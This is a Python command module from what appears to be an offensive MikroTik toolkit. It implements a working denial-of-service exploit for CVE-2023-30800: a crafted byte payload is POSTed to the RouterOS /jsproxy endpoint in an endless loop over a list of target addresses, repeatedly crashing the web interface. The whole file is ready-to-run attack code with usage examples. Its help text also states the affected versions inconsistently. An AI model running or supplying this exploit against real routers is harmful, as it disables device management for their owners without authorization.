# CVE-2023-30800
# The web server used by MikroTik RouterOS version 6 is affected
# by a heap memory corruption issue. A remote and unauthenticated
# attacker can corrupt the server's heap memory by sending a
# crafted HTTP request. As a result, the web interface crashes and
# is immediately restarted. The issue was fixed in RouterOS 6.49.10 stable.
# RouterOS version 7 is not affected.
# More information at: https://nvd.nist.gov/vuln/detail/CVE-2023-30800

from typing import Annotated

import requests
import typer
from requests.exceptions import ConnectionError
from rich import print

from mkx.core.helps import KILL_WEB_SERVER_HELP

DATA = b'\x00\x00\x00\x00\x00\x00\x00\x00\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e'

command = typer.Typer(
    help=KILL_WEB_SERVER_HELP,
    short_help='Attack that crashes the web interface of RouterOS versions 6 > 6.49.10 (CVE-2023-30800).',
    no_args_is_help=True,
    rich_markup_mode='markdown',
)


@command.callback(invoke_without_command=True)
def main(
    target: Annotated[
        str,
        typer.Argument(
            help='Target IP address or list of IP addresses and TCP ports.'
        ),
    ],
    https: Annotated[
        bool,
        typer.Option(
            '--https', '-s', help='Configure the attack for an https server.'
        ),
    ] = False,
):
    """
    Attack that crashes the web interface of RouterOS versions 6 > 6.49.10.

    CVE-2023-30800

    The web server used by MikroTik RouterOS version 6 is affected by
    a heap memory corruption issue. A remote and unauthenticated attacker
    can corrupt the server's heap memory by sending a crafted HTTP request.
    As a result, the web interface crashes and is immediately restarted.
    The issue was fixed in RouterOS 6.49.10 stable.
    RouterOS version 7 is not affected.

    **Examples:**

    - mkx kill-web-server 172.16.0.123:80

    - mkx kill-web-server 172.16.0.123:80,172.16.0.124:80
    """
    target = target.split(',')
    http = 'http'

    if https:
        http = 'https'

    print(
        '[bold red][[/bold red]'
        '[bold yellow]+[/bold yellow]'
        '[bold red]][/bold red]'
        ' Performing web server crash attack...'
    )
    print(
        '[bold red][[/bold red]'
        '[bold yellow]+[/bold yellow]'
        '[bold red]][/bold red]'
        ' Prees [bold red]Ctrl[/bold red]'
        '+[bold red]C[/bold red] to stop'
    )

    while True:
        try:
            for ip in target:
                try:
                    requests.post(
                        f'{http}://{ip}/jsproxy',
                        headers={'Content-Type': 'msg'},
                        data=DATA,
                    )
                except ConnectionError:
                    pass
        except KeyboardInterrupt:
            break
    typer.Exit()
